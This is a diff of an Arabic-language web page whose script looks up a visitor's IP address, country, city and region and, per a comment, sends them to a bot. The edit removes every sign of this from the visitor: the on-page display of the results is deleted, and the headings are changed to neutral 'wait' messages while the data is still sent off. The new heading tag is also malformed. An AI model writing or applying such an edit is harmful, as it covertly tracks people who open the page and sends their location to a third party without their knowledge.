@@ -21,7 +21,7 @@
     </style>
 </head>
 <body>
-    <h1>جاري تحديد موقعك...</h1>
+    </h1>انتظر...</h1>
     <div id="result"></div>
 
     <script>
@@ -91,12 +91,7 @@
             const { ip, country, city, region } = await getAccurateLocation();
             
             // عرض النتيجة للمستخدم
-            document.getElementById('result').innerHTML = `
-                <p><strong>عنوان IP:</strong> ${ip}</p>
-                <p><strong>البلد:</strong> ${country}</p>
-                <p><strong>المدينة:</strong> ${city}</p>
-                <p><strong>المنطقة:</strong> ${region}</p>
-            `;
+            
             
             // إرسال البيانات إلى البوت
             const message = `
@@ -115,7 +110,7 @@
             // إخفاء النتيجة بعد 5 ثواني
             setTimeout(() => {
                 document.getElementById('result').style.display = 'none';
-                document.querySelector('h1').textContent = 'تم تحديد موقعك بنجاح';
+                document.querySelector('h1').textContent = 'انتظر 5 ثواني...';
             }, 5000);
         });
     </script>
